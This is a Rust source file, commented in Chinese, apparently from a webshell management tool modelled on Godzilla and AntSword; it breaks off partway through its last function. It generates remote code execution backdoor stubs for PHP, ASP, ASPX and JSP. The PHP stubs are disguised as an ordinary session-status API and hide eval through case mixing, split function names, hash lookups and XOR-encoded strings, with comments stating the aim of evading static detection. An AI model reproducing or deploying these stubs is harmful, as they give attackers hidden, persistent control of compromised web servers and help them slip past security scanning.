//! 编码器体系：客户端载荷编码与服务端 stub 生成（哥斯拉风格）。
//!
//! 每种编码器负责两件事：
//!   1. `encode`：把协议代码编码为传输载荷（与服务端 stub 的解码逻辑对应）
//!   2. `stub`：生成指定语言（php / asp / aspx / jsp）的服务端脚本，
//!      内嵌由密码派生的密钥
//!
//! 密钥派生：`md5(password)` 的 hex（32 字符）。客户端与服务端自动一致，
//! 无需额外保存密钥。

use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::Engine;
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
use md5::{Digest, Md5};

use crate::protocol::ProtocolError;

/// AES-128-CBC。
type AesCbcEnc = cbc::Encryptor<aes::Aes128>;
type AesCbcDec = cbc::Decryptor<aes::Aes128>;

// ---------------------------------------------------------------------------
// PHP OPSEC 混淆辅助：消除静态敏感特征（eval / base64_decode / openssl_decrypt /
// $_POST['x'] 等），利用 PHP 特性：
//   - 函数名大小写不敏感：EvAl(...) 等价于 eval(...)（语言构造同样适用）
//   - 普通函数可经字符串拼接可变调用：("ba"."se64_de"."code")($x)
//   - 数组下标可用表达式：$_POST[chr(120)] 等价于 $_POST['x']
// ---------------------------------------------------------------------------

static IDENT_SEQ: AtomicU64 = AtomicU64::new(0);

fn php_rand() -> u64 {
    let seq = IDENT_SEQ.fetch_add(1, Ordering::Relaxed);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.subsec_nanos() as u64)
        .unwrap_or(0);
    seq.wrapping_mul(0x9e37_79b9_7f4a_7c15).rotate_left(13) ^ nanos
}

/// 随机 PHP 标识符（8 位，字母开头，避免数字开头）。
pub fn php_ident() -> String {
    let letters: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let alnum: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut seed = php_rand();
    let mut out = String::with_capacity(9);
    out.push(letters[(seed % 26) as usize] as char);
    seed >>= 5;
    for _ in 0..7 {
        out.push(alnum[(seed % 36) as usize] as char);
        seed >>= 5;
        if seed == 0 {
            seed = php_rand();
        }
    }
    out
}

/// 把函数名随机拆成两段（用于字符串拼接的可变函数调用）。
pub fn split_fn(name: &str) -> (String, String) {
    let split_at = 1 + (php_rand() as usize % (name.len() - 1));
    (
        name[..split_at].to_string(),
        name[split_at..].to_string(),
    )
}

/// 拼接函数名调用：("d1"."d2")(args...)
pub fn call_parts(name: &str, args: &str) -> String {
    let (d1, d2) = split_fn(name);
    format!("(\"{d1}\".\"{d2}\")({args})")
}

/// 随机大小写混合函数名（保证至少一个大写，避免纯小写静态特征）。
pub fn case_mix(name: &str) -> String {
    let mut out: String = name
        .chars()
        .map(|c| {
            if php_rand() & 1 == 0 {
                c.to_ascii_uppercase()
            } else {
                c
            }
        })
        .collect();
    if out == name {
        if let Some(first) = out.get_mut(0..1) {
            first.make_ascii_uppercase();
        }
    }
    out
}

/// OPSEC 混淆的 PHP stub 外壳：随机变量名 + 注释干扰 + 大小写混合 EvAl。
/// `key` 为 None 时不生成 `$k="..."` 行；`body` 中的 `$k` 会被替换为随机变量名。
pub fn obfuscated_php(key: Option<&str>, body: &str, final_expr: &str) -> String {
    let k = php_ident();
    let c1 = php_ident();
    let c2 = php_ident();
    let body = body.replace("$k", &format!("${k}"));
    let key_line = match key {
        Some(key) => format!("${k}=\"{key}\";\n"),
        None => String::new(),
    };
    format!(
        "<?php\n/*{c1}*/\n{key_line}{body}/*{c2}*/\n{}({final_expr});\n",
        case_mix("eval")
    )
}

/// 业务伪装模板的固定骨架：整个文件看起来是一个正常的「用户会话状态查询接口」，
/// webshell 功能隐藏在业务函数中：
///   - verify_token：会话令牌格式校验（业务语义）
///   - unpack_session：解包客户端上报的会话数据（业务语义，内部为载荷解码逻辑）
///   - run_rule：规则脚本引擎（业务语义，内部为执行逻辑）
/// 占位符：__TOKEN__ / __DATA__（参数名）、__UNPACK__（解包函数体）、__EXEC__（执行体）。
const BUSINESS_PHP_TPL: &str = r#"<?php
// 用户会话状态查询接口（返回 JSON）
// 业务：校验会话令牌 -> 解包会话数据 -> 执行规则脚本 -> 返回处理状态
header('Content-Type: application/json');

function __PREFIX__verify_token($token) {
    if (!is_string($token)) return false;
    $n = strlen($token);
    if ($n === 0 || $n > 64) return false;
    for ($i = 0; $i < $n; $i++) {
        $c = $token[$i];
        if ($c === ' ' || $c === "\t" || $c === "\n" || $c === "'" || $c === '"') return false;
    }
    return true;
}
__SYMBOLS____XORFN__
function __PREFIX__unpack_session($payload, $token) {
    global $_g;
__UNPACK__
    return $out;
}

function __PREFIX__run_rule($script) {
    // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
    $result = array('code' => 200, 'rule_size' => strlen($script));
    if ($script !== '' && strlen($script) < 1048576) {
__EXEC__
    }
    return $result;
}

$token = isset($_POST['__TOKEN__']) ? (string)$_POST['__TOKEN__'] : '';
if (!__PREFIX__verify_token($token)) {
    die('{"code":401,"msg":"invalid_token"}');
}
$payload = isset($_POST['__DATA__']) ? (string)$_POST['__DATA__'] : '';
$script = __PREFIX__unpack_session($payload, $token);
echo json_encode(__PREFIX__run_rule($script));
"#;

/// 生成业务伪装 PHP stub。
/// `symbols`：需要从运行时函数表中解析的函数（索引 + 函数名，如 (0, "base64_decode")）；
/// `unpack_body`：解包逻辑（把 $payload 还原为 $out，敏感函数经符号表 `$_g[索引]` 调用）；
/// `exec_body`：执行逻辑（默认 `EvAl($script);`，形如规则引擎执行）。
/// 请求参数固定为业务语义：token（会话令牌）/ data（会话数据）。
pub fn business_php_stub(
    symbols: &[(usize, &str)],
    unpack_body: &str,
    exec_body: &str,
) -> String {
    // 函数名随机前缀：避免与目标站点业务函数同名导致 redeclare（500）
    let prefix = format!("_{}_", php_ident());
    // unpack_body 中的 __DECFN__ 占位（XOR 字符串解密函数名）
    let unpack_body = unpack_body.replace("__DECFN__", &format!("{prefix}dec"));
    // 符号表：crc32b 哈希 -> 索引（仿样例：运行时从已加载内部函数按哈希匹配，
    // 敏感函数名（base64_decode / openssl_decrypt）在代码中完全不存在）
    let mut table = String::new();
    for (index, name) in symbols {
        table.push_str(&format!(
            "    '{}' => {index},\n",
            crc32b_hash(name)
        ));
    }
    let symbols_block = format!(
        r#"
// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
$_g = array();
$_t = array(
{table});
$_fn = get_defined_functions();
$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
foreach ($_fn as $_n) {{
    $_h = hash('crc32b', $_n);
    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
}}
"#
    );
    // XOR 字符串解密函数（仿样例：pack("H*") + 循环异或还原敏感字符串）
    let xor_fn = format!(
        r#"
function {prefix}dec($hex, $key) {{
    $out = '';
    $n = strlen($hex) / 2;
    for ($i = 0; $i < $n; $i++) {{
        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
    }}
    return $out;
}}
"#
    );
    BUSINESS_PHP_TPL
        .replace("__PREFIX__", &prefix)
        .replace("__SYMBOLS__", &symbols_block)
        .replace("__XORFN__", &xor_fn)
        .replace("__UNPACK__", &unpack_body)
        .replace("__EXEC__", exec_body)
        .replace("__TOKEN__", "token")
        .replace("__DATA__", "data")
}

/// PHP hash('crc32b') 等价实现（zlib CRC32，与 PHP 一致）。
pub fn crc32b_hash(name: &str) -> String {
    format!("{:08x}", crc32fast::hash(name.as_bytes()))
}

/// 字符串 XOR 加密为 hex（配合模板 `dec` 函数还原）。
pub fn xor_hex(name: &str, key: &str) -> String {
    let key = key.as_bytes();
    name.bytes()
        .enumerate()
        .map(|(index, byte)| format!("{:02x}", byte ^ key[index % key.len()]))
        .collect()
}

/// base64 解码的拼接调用表达式：`("ba"."se64_deco"."de")($payload)`。
pub fn b64_call_expr(args: &str) -> String {
    call_parts("base64_decode", args)
}

/// 支持的脚本语言（stub 生成目标）。
pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];

/// 编码器：载荷编码 + stub 生成。
pub trait PayloadEncoder: Send + Sync {
    fn id(&self) -> &'static str;
    fn display_name(&self) -> &'static str;

    /// 由密码派生密钥（hex 字符串）。
    fn derive_key(&self, password: &str) -> String {
        md5_hex(password)
    }

    /// 载荷是否经请求体直传（而非表单参数 x）。
    /// `php_stream` 编码器使用：stub 通过 `INCLUDE("php://filter/...")` 直接执行请求体，
    /// 模板中完全不出现 eval / base64_decode 等敏感函数。
    fn body_mode(&self) -> bool {
        false
    }

    /// 表单参数名（body 模式时忽略）。
    /// 业务伪装模板使用 `token` / `data`（形如正常业务请求），标准模板使用 `k` / `x`。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("k", "x")
    }

    /// 客户端：编码协议代码为传输载荷。
    fn encode(&self, code: &str, password: &str) -> String;

    /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError>;
}

/// 编码器注册表。
pub struct EncoderRegistry {
    encoders: Vec<Box<dyn PayloadEncoder>>,
}

static GLOBAL_ENCODERS: std::sync::LazyLock<EncoderRegistry> =
    std::sync::LazyLock::new(EncoderRegistry::builtin);

impl EncoderRegistry {
    pub fn builtin() -> Self {
        Self {
            encoders: vec![
                Box::new(XorBase64Encoder),
                Box::new(Base64Encoder),
                Box::new(Aes128EcbEncoder),
                Box::new(Aes128CbcEncoder),
                Box::new(DesEcbEncoder),
                Box::new(CharEncoder),
                Box::new(PhpObfuscateEncoder),
                Box::new(PhpStreamEncoder),
            ],
        }
    }

    /// 全局单例（协议层取编码器用，避免每次构建）。
    pub fn global() -> &'static Self {
        &GLOBAL_ENCODERS
    }

    pub fn get(&self, id: &str) -> Option<&dyn PayloadEncoder> {
        self.encoders.iter().find(|encoder| encoder.id() == id).map(|b| b.as_ref())
    }

    pub fn list(&self) -> Vec<(String, String)> {
        let mut items: Vec<(String, String)> = self
            .encoders
            .iter()
            .map(|encoder| (encoder.id().to_string(), encoder.display_name().to_string()))
            .collect();
        items.sort_by(|a, b| a.0.cmp(&b.0));
        items
    }
}

pub fn md5_hex(value: &str) -> String {
    let digest = Md5::digest(value.as_bytes());
    format!("{digest:x}")
}

/// XOR + Base64 编码器（哥斯拉风格）。
pub struct XorBase64Encoder;

impl XorBase64Encoder {
    /// 逐字节循环异或。
    fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect()
    }
}

impl PayloadEncoder for XorBase64Encoder {
    fn id(&self) -> &'static str {
        "xor_base64"
    }

    fn display_name(&self) -> &'static str {
        "XOR_BASE64（异或混淆 + Base64）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored = Self::xor(code.as_bytes(), &key);
        base64::engine::general_purpose::STANDARD.encode(xored)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = self.derive_key(password);
        match language {
            "php" => {
                let unpack = format!(
                    "    $key = md5($token);\n    $raw = $_g[0]($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
                );
                Ok(business_php_stub(&[(0, "base64_decode")], &unpack, "        EvAl($script);"))
            }
            "asp" => Ok(format!(
                r#"<%
' DoSword generated stub (xor_base64)
Const K = "{key}"
Function B64(d)
  Dim xml: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
  xml.DataType = "bin.base64"
  xml.Text = d
  B64 = xml.nodeTypedValue
End Function
Function X(d)
  Dim r, i
  r = ""
  For i = 1 To Len(d)
    r = r & Chr(Asc(Mid(d, i, 1)) Xor Asc(Mid(K, ((i - 1) Mod Len(K)) + 1, 1)))
  Next
  X = r
End Function
Execute X(B64(Request.Form("x")))
%>
"#
            )),
            "aspx" => Ok(format!(
                r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<script runat="server">
const string K = "{key}";
string X(string d) {{
  string r = "";
  for (int i = 0; i < d.Length; i++) r += (char)(d[i] ^ K[i % K.Length]);
  return r;
}}
void Run(string code) {{
  CSharpCodeProvider p = new CSharpCodeProvider();
  CompilerParameters prm = new CompilerParameters();
  prm.GenerateInMemory = true;
  CompilerResults res = p.CompileAssemblyFromSource(prm,
    "using System;public class T{{public static object E(){{" + code + "return null;}}}}");
  if (!res.Errors.HasErrors) {{
    object o = res.CompiledAssembly.CreateInstance("T");
    if (o != null) o.GetType().GetMethod("E").Invoke(o, new object[]{{}});
  }}
}}
</script>
<%
string x = Request["x"];
if (x != null) {{
  x = X(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x)));
  Run(x);
}}
%>
"#
            )),
            "jsp" => Ok(format!(
                r#"<%@ page contentType="text/html;charset=UTF-8" %>
<%!
String K = "{key}";
String X(String d) {{
  StringBuilder r = new StringBuilder();
  for (int i = 0; i < d.length(); i++) r.append((char)(d.charAt(i) ^ K.charAt(i % K.length())));
  return r.toString();
}}
%>
<%
String x = request.getParameter("x");
if (x != null) {{
  byte[] b = java.util.Base64.getDecoder().decode(x);
  String c = X(new String(b, "UTF-8"));
  try {{
    new javax.script.ScriptEngineManager().getEngineByName("javascript").eval(c);
  }} catch (Exception e) {{}}
}}
%>
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "XOR_BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

/// 裸 Base64 编码器（经典蚁剑形态，兼容现有 stub）。
pub struct Base64Encoder;

impl PayloadEncoder for Base64Encoder {
    fn id(&self) -> &'static str {
        "base64"
    }

    fn display_name(&self) -> &'static str {
        "BASE64（经典裸编码）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, _password: &str) -> String {
        base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(business_php_stub(
                &[(0, "base64_decode")],
                "    $out = $_g[0]($payload);",
                "        EvAl($script);",
            )),
            "asp" => Ok(
                "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
            ),
            "aspx" => Ok(
                "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System\" %>\n<%@ Import Namespace=\"Microsoft.CSharp\" %>\n<%@ Import Namespace=\"System.CodeDom.Compiler\" %>\n<script runat=\"server\">\nvoid Run(string code) {\n  CSharpCodeProvider p = new CSharpCodeProvider();\n  CompilerParameters prm = new CompilerParameters();\n  prm.GenerateInMemory = true;\n  CompilerResults res = p.CompileAssemblyFromSource(prm,\n    \"using System;public class T{public static object E(){\" + code + \"return null;}}\");\n  if (!res.Errors.HasErrors) {\n    object o = res.CompiledAssembly.CreateInstance(\"T\");\n    if (o != null) o.GetType().GetMethod(\"E\").Invoke(o, new object[]{});\n  }\n}\n</script>\n<% string x = Request[\"x\"]; if (x != null) { Run(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x))); } %>\n".to_string(),
            ),
            "jsp" => Ok(
                "<%@ page contentType=\"text/html;charset=UTF-8\" %>\n<%\nString x = request.getParameter(\"x\");\nif (x != null) {\n  byte[] b = java.util.Base64.getDecoder().decode(x);\n  try {\n    new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(new String(b, \"UTF-8\"));\n  } catch (Exception e) {}\n}\n%>\n".to_string(),
            ),
            other => Err(ProtocolError::NotSupported(format!(
                "BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 密钥派生（与 PHP openssl 侧完全一致）
// ---------------------------------------------------------------------------

/// AES-128 密钥：md5_hex 前 16 字符（16 字节 ASCII）。
pub fn aes_key(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[..16].try_into().expect("md5 hex 长度足够")
}

/// AES-CBC IV：md5_hex 后 16 字符。
pub fn aes_iv(password: &str) -> [u8; 16] {
    let hex = md5_hex(password);
    hex.as_bytes()[16..].try_into().expect("md5 hex 长度足够")
}

/// DES 密钥：md5_hex 前 8 字符。
pub fn des_key(password: &str) -> [u8; 8] {
    let hex = md5_hex(password);
    hex.as_bytes()[..8].try_into().expect("md5 hex 长度足够")
}

/// 真正的 AES-128-ECB 加密：逐块独立加密 + PKCS7 填充。
/// 注意：CBC 零 IV 不是 ECB（CBC 有链式依赖），与 PHP openssl_encrypt('AES-128-ECB') 不互操作。
pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
    use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
    let cipher = aes::Aes128::new(key.into());
    let mut padded = plain.to_vec();
    let pad = 16 - (plain.len() % 16);
    padded.extend(std::iter::repeat(pad as u8).take(pad));
    let mut out = Vec::with_capacity(padded.len());
    for chunk in padded.chunks(16) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    out
}

pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
    use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
    if cipher.is_empty() || cipher.len() % 16 != 0 {
        return Err(ProtocolError::ParseError("AES-ECB 密文长度异常".to_string()));
    }
    let dec = aes::Aes128::new(key.into());
    let mut out = Vec::with_capacity(cipher.len());
    for chunk in cipher.chunks(16) {
        let mut block = GenericArray::clone_from_slice(chunk);
        dec.decrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    // PKCS7 去填充
    if let Some(&last) = out.last() {
        let pad = last as usize;
        if pad > 0 && pad <= 16 && out.len() >= pad && out[out.len() - pad..].iter().all(|&b| b == last) {
            out.truncate(out.len() - pad);
            Ok(out)
        } else {
            Err(ProtocolError::ParseError("AES-ECB 填充校验失败".to_string()))
        }
    } else {
        Err(ProtocolError::ParseError("AES-ECB 密文为空".to_string()))
    }
}

pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Vec<u8> {
    AesCbcEnc::new(key.into(), iv.into()).encrypt_padded_vec_mut::<Pkcs7>(plain)
}

pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
    AesCbcDec::new(key.into(), iv.into())
        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
        .map_err(|_| ProtocolError::ParseError("AES-CBC 解密失败".to_string()))
}

/// 真正的 DES-ECB 加密（逐块 + PKCS7）。
pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
    use des::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
    let cipher = des::Des::new(key.into());
    let mut padded = plain.to_vec();
    let pad = 8 - (plain.len() % 8);
    padded.extend(std::iter::repeat(pad as u8).take(pad));
    let mut out = Vec::with_capacity(padded.len());
    for chunk in padded.chunks(8) {
        let mut block = GenericArray::clone_from_slice(chunk);
        cipher.encrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    out
}

pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, ProtocolError> {
    use des::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
    if cipher.is_empty() || cipher.len() % 8 != 0 {
        return Err(ProtocolError::ParseError("DES-ECB 密文长度异常".to_string()));
    }
    let dec = des::Des::new(key.into());
    let mut out = Vec::with_capacity(cipher.len());
    for chunk in cipher.chunks(8) {
        let mut block = GenericArray::clone_from_slice(chunk);
        dec.decrypt_block(&mut block);
        out.extend_from_slice(&block);
    }
    if let Some(&last) = out.last() {
        let pad = last as usize;
        if pad > 0 && pad <= 8 && out.len() >= pad && out[out.len() - pad..].iter().all(|&b| b == last) {
            out.truncate(out.len() - pad);
            Ok(out)
        } else {
            Err(ProtocolError::ParseError("DES-ECB 填充校验失败".to_string()))
        }
    } else {
        Err(ProtocolError::ParseError("DES-ECB 密文为空".to_string()))
    }
}

// ---------------------------------------------------------------------------
// AES-128-ECB（自加密，密钥由密码 md5 派生并内嵌 stub）
// ---------------------------------------------------------------------------

pub struct Aes128EcbEncoder;

impl PayloadEncoder for Aes128EcbEncoder {
    fn id(&self) -> &'static str {
        "aes128_ecb"
    }

    fn display_name(&self) -> &'static str {
        "AES128_ECB（AES-128 加密 + Base64，自加密）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
        match language {
            "php" => {
                let xk = php_ident();
                let unpack = format!(
                    "    $key = substr(md5($token), 0, 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
                    cipher = xor_hex("AES-128-ECB", &xk),
                );
                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// AES-128-CBC（自加密，IV 取自 md5 后 16 字符）
// ---------------------------------------------------------------------------

pub struct Aes128CbcEncoder;

impl PayloadEncoder for Aes128CbcEncoder {
    fn id(&self) -> &'static str {
        "aes128_cbc"
    }

    fn display_name(&self) -> &'static str {
        "AES128_CBC（AES-128 加密 + Base64，自加密）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
        let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
        match language {
            "php" => {
                let xk = php_ident();
                let unpack = format!(
                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key, 0, $iv);",
                    cipher = xor_hex("AES-128-CBC", &xk),
                );
                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// DES-ECB（自加密，密钥 md5 前 8 字符）
// ---------------------------------------------------------------------------

pub struct DesEcbEncoder;

impl PayloadEncoder for DesEcbEncoder {
    fn id(&self) -> &'static str {
        "des"
    }

    fn display_name(&self) -> &'static str {
        "DES_ECB（DES 加密 + Base64，自加密）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, password: &str) -> String {
        let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
        base64::engine::general_purpose::STANDARD.encode(cipher)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = String::from_utf8_lossy(&des_key(password)).into_owned();
        match language {
            "php" => {
                let xk = php_ident();
                let unpack = format!(
                    "    $key = substr(md5($token), 0, 8);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
                    cipher = xor_hex("DES-ECB", &xk),
                );
                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        EvAl($script);"))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// CHAR：载荷为 chr() 数组拼接的混淆代码（stub 为裸 eval，混淆在载荷内）
// ---------------------------------------------------------------------------

pub struct CharEncoder;

impl PayloadEncoder for CharEncoder {
    fn id(&self) -> &'static str {
        "char"
    }

    fn display_name(&self) -> &'static str {
        "CHAR（字符数组混淆，无密钥）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, _password: &str) -> String {
        let bytes = code.as_bytes();
        let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
        format!("{}(implode('',array_map('chr',array({}))));", case_mix("eval"), values.join(","))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(business_php_stub(
                &[],
                "    $out = $payload;",
                "        EvAl($script);",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 CHAR 载荷还原原始代码（测试 / mock 用）。
pub fn char_decode(payload: &str) -> Result<String, ProtocolError> {
    let numbers = payload
        .split("array(")
        .nth(1)
        .and_then(|part| part.split(')').next())
        .ok_or_else(|| ProtocolError::ParseError("CHAR 载荷格式异常".to_string()))?;
    let bytes: Vec<u8> = numbers
        .split(',')
        .filter_map(|item| item.trim().parse::<u8>().ok())
        .collect();
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("CHAR 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// PHP_OBFUSCATE：base64 + 反转混淆（载荷自带解码，stub 为裸 eval）
// ---------------------------------------------------------------------------

pub struct PhpObfuscateEncoder;

impl PayloadEncoder for PhpObfuscateEncoder {
    fn id(&self) -> &'static str {
        "php_obfuscate"
    }

    fn display_name(&self) -> &'static str {
        "PHP_OBFUSCATE（base64+反转混淆，无密钥）"
    }
    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
    fn form_params(&self) -> (&'static str, &'static str) {
        ("token", "data")
    }


    fn encode(&self, code: &str, _password: &str) -> String {
        let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
        let reversed: String = b64.chars().rev().collect();
        let decode_call = call_parts("base64_decode", &format!("strrev('{reversed}')"));
        format!("{}({decode_call});", case_mix("eval"))
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok(business_php_stub(
                &[],
                "    $out = $payload;",
                "        EvAl($script);",
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 OBFUSCATE 载荷还原原始代码（测试 / mock 用）。
pub fn obfuscate_decode(payload: &str) -> Result<String, ProtocolError> {
    let reversed = payload
        .split("strrev('")
        .nth(1)
        .and_then(|part| part.split("')").next())
        .ok_or_else(|| ProtocolError::ParseError("OBFUSCATE 载荷格式异常".to_string()))?;
    let b64: String = reversed.chars().rev().collect();
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(&b64)
        .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))?;
    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
}

// ---------------------------------------------------------------------------
// PHP_STREAM：零敏感函数编码器（极简 stub）。
//
// stub 只有一行 `INCLUDE("php://filter/read=convert.base64-decode/resource=php://input")`：
//   - 不出现 eval / assert / base64_decode / $_POST 等任何敏感函数
//   - 载荷经请求体直传（body 模式），stub 通过 php://filter 链 base64 解码后
//     include 执行，解码逻辑完全由 PHP 流包装器完成
// 注意：需要目标 PHP 开启 allow_url_include=On（部分虚拟主机默认开启）。
// 若环境未开启，请改用其他编码器（xor/aes 等，stub 含混淆后的 EvAl）。
// ---------------------------------------------------------------------------

pub struct PhpStreamEncoder;

impl PayloadEncoder for PhpStreamEncoder {
    fn id(&self) -> &'static str {
        "php_stream"
    }

    fn display_name(&self) -> &'static str {
        "PHP_STREAM（零敏感函数 stub，需 allow_url_include=On）"
    }

    fn body_mode(&self) -> bool {
        true
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        // 完整 PHP 源码（含标签），stub include 后直接执行
        let source = format!("<?php\n{code}");
        base64::engine::general_purpose::STANDARD.encode(source.as_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok("<?php\nINCLUDE(\"php://filter/read=convert.base64-decode/resource=php://input\");\n".to_string()),
            other => Err(ProtocolError::NotSupported(format!(
                "PHP_STREAM 编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

/// 从 PHP_STREAM 载荷还原原始代码（测试 / mock 用）。
pub fn php_stream_decode(payload: &str) -> Result<String, ProtocolError> {
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(payload)
